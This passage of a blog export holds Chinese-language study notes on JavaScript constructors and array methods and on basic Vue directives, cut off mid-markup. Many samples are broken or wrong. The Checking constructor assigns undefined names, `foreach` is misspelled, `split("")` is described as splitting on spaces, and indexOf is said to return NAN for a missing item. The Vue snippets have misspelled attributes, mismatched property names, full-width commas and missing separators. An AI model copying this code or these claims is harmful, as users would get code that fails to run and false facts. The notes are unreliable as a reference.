class="comment">//显示3.30</span></span><br></pre></td></tr></table></figure><h4 id="OOP-object-oriented-programming"><a href="#OOP-object-oriented-programming" class="headerlink" title="OOP (object-oriented programming)"></a>OOP (object-oriented programming)</h4><p>构建一个检查银行账户对象的构造函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Checking</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">balance</span> = balance;<span class="comment">//属性</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">deposit</span> = deposite; <span class="comment">//方法</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">withdraw</span> = withdraw; <span class="comment">//方法</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">toString</span> = toString; <span class="comment">//方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this关键字用来将方法和属性绑定到一个对象的实例上</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">balance</span> += amount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">balance</span>&lt;amount)&#123;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;Insufficient funds&quot;</span>)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">balance</span> -= amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Balance:&quot;</span>+ <span class="variable language_">this</span>.<span class="property">balance</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法的互相引用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> bank = <span class="keyword">new</span> <span class="title class_">Checking</span>(<span class="number">500</span>);</span><br><span class="line">bank.<span class="title function_">deposit</span>(<span class="number">100</span>);</span><br><span class="line">bank.<span class="title function_">withdraw</span>(<span class="number">400</span>);</span><br></pre></td></tr></table></figure><h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h4><p>调用方法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">let</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>);<span class="comment">//定义长度</span></span><br></pre></td></tr></table></figure><p><u>字符串</u>生成<u>数组</u>：</p><p><strong>split()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;A is a cat&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arr = str.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);<span class="comment">//根据空格分隔产生数组</span></span><br></pre></td></tr></table></figure><p><strong>浅复制</strong>和<strong>深复制</strong>：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1;</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2[<span class="number">0</span>]);<span class="comment">//输出100</span></span><br></pre></td></tr></table></figure><p><u>这种行为就叫做<strong>浅复制</strong>，新数组依然指向原来的数组，如果需要改变新数组的值，则需要使用<strong>深复制</strong>的方案</u></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">cp</span>(<span class="params">arr1,arr2</span>)&#123;</span><br><span class="line">  arr1.<span class="title function_">foreach</span>(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    arr2[index] = item;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><u>这种叫做深复制</u></strong>，将旧数组每一项的元素赋值到新数组上</p><h4 id="Access-function"><a href="#Access-function" class="headerlink" title="Access function"></a>Access function</h4><p>查找元素：</p><p><strong>indexOf()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> position = arr.<span class="title function_">indexOf</span>(<span class="string">&quot;b&quot;</span>);<span class="comment">//position为1</span></span><br><span class="line"><span class="keyword">let</span> position1 = arr.<span class="title function_">indexOf</span>(<span class="string">&quot;v&quot;</span>);<span class="comment">//position1位NAN</span></span><br></pre></td></tr></table></figure><p>如果数组中包含多个相同的元素，用indexOf()返回数组<u><strong>第一个值</strong></u>的索引</p><p><strong>lastIndexOf()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> position = arr.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;b&quot;</span>);<span class="comment">//position为2</span></span><br></pre></td></tr></table></figure><p>如果数组中包含多个相同的元素，用indexOf()返回数组<u><strong>最后一个值</strong></u>的索引</p><p>数组的字符串表示：</p><p><strong>join(),toString()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = [<span class="string">&quot;jack&quot;</span>,<span class="string">&quot;pack&quot;</span>,<span class="string">&quot;john&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> namestr = name.<span class="title function_">join</span>();</span><br><span class="line"><span class="keyword">let</span> namestr1 = name.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(namestr)<span class="comment">//输出jack,pack,john</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(namestr1)<span class="comment">//输出jack,pack,john</span></span><br></pre></td></tr></table></figure><p>这两个方法都返回一个包含数组所有元素的字符串，各元素之间用逗号分隔开。</p><p>实际上，当直接对<u><strong>一个数组</strong></u>使用<u><strong>print()函数</strong></u>时，系统会自动调用哪个数组的toString()方法。</p><p>由已知数组创建新数组：</p><p><strong>concat()</strong>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>];</span><br><span class="line"><span class="keyword">let</span> newarr = arr.<span class="title function_">concat</span>(arr2);</span><br><span class="line"><span class="title function_">print</span>(newarr);<span class="comment">//输出1,2,3,4,5,6,7,8</span></span><br></pre></td></tr></table></figure><p>Array.concat(Array),作为参数的数组拼接在发起者的数组上</p><p><u><strong>splice()</strong></u>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> resultarr = arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resultarr)<span class="comment">//打印出[b,c]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)<span class="comment">//打印出[a,d]</span></span><br></pre></td></tr></table></figure><p>该方法第一个参数是截取的起始索引，第二个参数是截取的长度。</p><p>splice方法还可以用于增加或移除元素</p><p>增加元素：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>];</span><br><span class="line">nums.<span class="title function_">splice</span>(<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);<span class="comment">//第三个参数开始为增添的元素</span></span><br></pre></td></tr></table></figure><p>删除元素：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">nums.<span class="title function_">splice</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numes);<span class="comment">//打印出1,2,3,4,5</span></span><br></pre></td></tr></table></figure><h4 id="The-variable-element："><a href="#The-variable-element：" class="headerlink" title="The variable element："></a>The variable element：</h4><p>添加元素:</p><p><strong>push()</strong>    从数组后面添加</p><p><strong>unshift()</strong>    从数组头添加</p><p>删除元素：</p><p><strong>pop()</strong>    从数组后面删除</p><p><strong>shift()</strong>    从数组头删除</p><p>本质上就是栈的操作</p><p>数组排序：</p><p><strong>reverse()</strong>    翻转数组元素顺序</p><p><strong>sort()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = [<span class="string">&quot;David&quot;</span>,<span class="string">&quot;Mike&quot;</span>,<span class="string">&quot;Cynthia&quot;</span>,<span class="string">&quot;Clayton&quot;</span>,<span class="string">&quot;Bryan&quot;</span>,<span class="string">&quot;Raymond&quot;</span>];</span><br><span class="line">names.<span class="title function_">sort</span>();</span><br><span class="line"><span class="title function_">print</span>(names);<span class="comment">//Bryan,Clayton,Cynthia,David,Mike,Raymond</span></span><br></pre></td></tr></table></figure><p>sort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。即使是Number类型也会转换成字符串类型在进行排序。对于数字的排序，会发生非常不友好的结果。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">100</span>,<span class="number">21</span>];</span><br><span class="line">arr.<span class="title function_">sort</span>();</span><br><span class="line"><span class="title function_">print</span>(arr);<span class="comment">//1,100,11,2,21,3,6</span></span><br></pre></td></tr></table></figure><p>就像上面一样，是按照字符串的字典顺序进行排序的，解决方法是通过sort传入一个大小比较函数解决排序问题</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">compare</span>(<span class="params">num1,num2</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> num1-num2</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> nums = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">100</span>,<span class="number">4</span>,<span class="number">200</span>];</span><br><span class="line">nums.<span class="title function_">sort</span>(compare);<span class="comment">//传入compare函数</span></span><br><span class="line"><span class="title function_">print</span>(nums);<span class="comment">//1,2,3,4,100,200</span></span><br></pre></td></tr></table></figure><h4 id="Lterator-method"><a href="#Lterator-method" class="headerlink" title="Lterator method"></a>Lterator method</h4><p>这些方法对数组中的每个元素应用一个函数，可以返回一个值、一组值或者一个新数组。</p><p>不生成新数组的迭代器方法：</p><p><strong>forEach()</strong>:</p><p>该方法接受一个函数作为参数，对数组中的每个元素使用该函数。</p>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
          <category> JavaScript </category>
          
          <category> 算法 </category>
          
          <category> 描述 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 算法 </tag>
            
            <tag> 描述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue_baselearning</title>
      <link href="/vue-baselearning.htm"/>
      <url>/vue-baselearning.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Vue基本入门知识点整理"><a href="#Vue基本入门知识点整理" class="headerlink" title="Vue基本入门知识点整理"></a>Vue基本入门知识点整理</h1><h2 id="Vue基本架构："><a href="#Vue基本架构：" class="headerlink" title="Vue基本架构："></a>Vue基本架构：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;templete&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">  <span class="attr">data</span>:&#123;</span><br><span class="line">    <span class="attr">templete</span>:<span class="string">&quot;VUE&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>:&#123;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><h3 id="el是绑定选中的元素的作用域，不可绑定在Html和body标签，里面可以绑定其他DOM元素，例如id-class-标签等，对应着-id，-class，标签等"><a href="#el是绑定选中的元素的作用域，不可绑定在Html和body标签，里面可以绑定其他DOM元素，例如id-class-标签等，对应着-id，-class，标签等" class="headerlink" title="el是绑定选中的元素的作用域，不可绑定在Html和body标签，里面可以绑定其他DOM元素，例如id,class,标签等，对应着#id，.class，标签等"></a>el是绑定选中的元素的作用域，<u>不可绑定在Html和body标签</u>，里面可以绑定其他DOM元素，例如<strong>id</strong>,<strong>class</strong>,<strong>标签</strong>等，对应着<strong>#id</strong>，<strong>.class</strong>，<strong>标签</strong>等</h3><h4 id="Vue在body里面定义的元素数据-用到的数据定义在data中-data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可"><a href="#Vue在body里面定义的元素数据-用到的数据定义在data中-data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可" class="headerlink" title="Vue在body里面定义的元素数据,用到的数据定义在data中,data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可"></a>Vue在body里面定义的元素数据<strong></strong>,用到的数据定义在data中,data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可</h4></blockquote><hr><h2 id="Vue函数："><a href="#Vue函数：" class="headerlink" title="Vue函数："></a>Vue函数：</h2><ul><li><h3 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;context_name+&#x27;lalala&#x27;&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出“他在lalala”</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;context_name&quot;</span>&gt;</span>呵呵呵<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出“他在”</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;message&#125;&#125;咳咳咳<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出“我在咳咳咳”</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>:<span class="string">&quot;我在&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">contex_name</span>:<span class="string">&quot;他在&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-text指令的作用是：设置标签的内容（textContent）"><a href="#v-text指令的作用是：设置标签的内容（textContent）" class="headerlink" title="v-text指令的作用是：设置标签的内容（textContent）"></a>v-text指令的作用是：设置标签的内容（textContent）</h3><h3 id="默认的写法会替换全部内容，使用差值表达式可以替换指定内容"><a href="#默认的写法会替换全部内容，使用差值表达式可以替换指定内容" class="headerlink" title="默认的写法会替换全部内容，使用差值表达式可以替换指定内容"></a>默认的写法会替换全部内容，使用差值表达式可以替换指定内容</h3><h3 id="内部支持写表达式"><a href="#内部支持写表达式" class="headerlink" title="内部支持写表达式"></a>内部支持写表达式</h3></blockquote><ul><li><h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-html</span>=<span class="string">&quot;baidu&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出一个普通文本字符</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-html</span>=<span class="string">&quot;baiduurl&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出一个超链接字符</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">baidu</span>:<span class="string">&quot;百度&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">baiduurl</span>:<span class="string">&quot;&lt;a herf=&quot;</span><span class="attr">https</span>:<span class="comment">//www.baidu.com&quot;&gt;百度&lt;/a&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-html指令的作用是：设置元素的innerHTML"><a href="#v-html指令的作用是：设置元素的innerHTML" class="headerlink" title="v-html指令的作用是：设置元素的innerHTML"></a>v-html指令的作用是：设置元素的innerHTML</h3><h3 id="内容中有html结构会被解析为标签"><a href="#内容中有html结构会被解析为标签" class="headerlink" title="内容中有html结构会被解析为标签"></a>内容中有html结构会被解析为标签</h3><h3 id="而对于v-text，v-text指令无论内容是什么，都只会解析成文本"><a href="#而对于v-text，v-text指令无论内容是什么，都只会解析成文本" class="headerlink" title="而对于v-text，v-text指令无论内容是什么，都只会解析成文本"></a>而对于v-text，v-text指令无论内容是什么，都只会解析成文本</h3><h3 id="解析文本使用v-text，需要解析html结构使用v-html"><a href="#解析文本使用v-text，需要解析html结构使用v-html" class="headerlink" title="解析文本使用v-text，需要解析html结构使用v-html"></a>解析文本使用v-text，需要解析html结构使用v-html</h3></blockquote><ul><li><h3 id="v-on基础"><a href="#v-on基础" class="headerlink" title="v-on基础"></a>v-on基础</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标单击&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标移入&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标双击&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标双击简写&quot;</span> @<span class="attr">dblclick</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> @<span class="attr">click</span>=<span class="string">&quot;changeword&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&quot;小白&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;，</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">do</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;你触发了&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">changeword</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">name</span> += 小白</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-on指令的作用是：为元素绑定事件"><a href="#v-on指令的作用是：为元素绑定事件" class="headerlink" title="v-on指令的作用是：为元素绑定事件"></a>v-on指令的作用是：为元素绑定事件</h3><h3 id="事件名不需要写on"><a href="#事件名不需要写on" class="headerlink" title="事件名不需要写on"></a>事件名不需要写on</h3><h3 id="指令可以简写为"><a href="#指令可以简写为" class="headerlink" title="指令可以简写为@"></a>指令可以简写为@</h3><h3 id="绑定的方法定义在methods属性中"><a href="#绑定的方法定义在methods属性中" class="headerlink" title="绑定的方法定义在methods属性中"></a>绑定的方法定义在methods属性中</h3><h3 id="方法内部通过this关键字可以访问定义在data中数据"><a href="#方法内部通过this关键字可以访问定义在data中数据" class="headerlink" title="方法内部通过this关键字可以访问定义在data中数据"></a>方法内部通过this关键字可以访问定义在data中数据</h3></blockquote><ul><li><h3 id="v-show基础"><a href="#v-show基础" class="headerlink" title="v-show基础"></a>v-show基础</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;显示/隐藏文字&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;show&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>你看到我吗<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShow</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;，</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">show</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">isShow</span> = !<span class="variable language_">this</span>.<span class="property">isShow</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-show指令的作用是：根据真假切换元素的显示状态"><a href="#v-show指令的作用是：根据真假切换元素的显示状态" class="headerlink" title="v-show指令的作用是：根据真假切换元素的显示状态"></a>v-show指令的作用是：根据真假切换元素的显示状态</h3><h3 id="原理是修改元素的disalay，实现显示隐藏"><a href="#原理是修改元素的disalay，实现显示隐藏" class="headerlink" title="原理是修改元素的disalay，实现显示隐藏"></a>原理是修改元素的disalay，实现显示隐藏</h3><h3 id="指令后面的内容，最终都会解析成布尔值"><a href="#指令后面的内容，最终都会解析成布尔值" class="headerlink" title="指令后面的内容，最终都会解析成布尔值"></a>指令后面的内容，最终都会解析成布尔值</h3><h3 id="值为true元素显示，值为false元素隐藏"><a href="#值为true元素显示，值为false元素隐藏" class="headerlink" title="值为true元素显示，值为false元素隐藏"></a>值为true元素显示，值为false元素隐藏</h3><h3 id="数据改变之后，对应元素的显示状态会同步更新"><a href="#数据改变之后，对应元素的显示状态会同步更新" class="headerlink" title="数据改变之后，对应元素的显示状态会同步更新"></a>数据改变之后，对应元素的显示状态会同步更新</h3></blockquote><ul><li><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;显示/隐藏文字&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;show&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>你看到我吗<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShow</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;，</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">show</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">isShow</span> = !<span class="variable language_">this</span>.<span class="property">isShow</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span 